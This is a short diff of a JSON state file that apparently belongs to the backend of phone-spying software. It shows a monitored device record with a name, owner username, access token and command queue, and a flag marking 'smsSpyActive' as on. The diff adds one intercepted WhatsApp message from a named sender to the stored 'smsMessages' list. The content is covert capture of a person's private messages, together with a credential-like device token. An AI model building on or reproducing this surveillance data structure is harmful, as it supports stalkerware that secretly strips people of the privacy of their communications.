@@ -4,7 +4,7 @@
     "deviceName": "HP-SANGEAN-6B64",
     "ownerUsername": "KUDANIL",
     "token": "3020da2f0f6d9f81513d32cd8944bd59",
-    "lastSeen": 1775228023856,
+    "lastSeen": 1775228053891,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-02T14:28:53.779Z",
@@ -7703,6 +7703,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Joni besar wd",
+        "content": "@⁨Meta AI⁩ cara isi bensin",
+        "time": "03/04 21:54",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775228055941
+      },
       {
         "appName": "WhatsApp",
         "sender": "Joni besar wd",
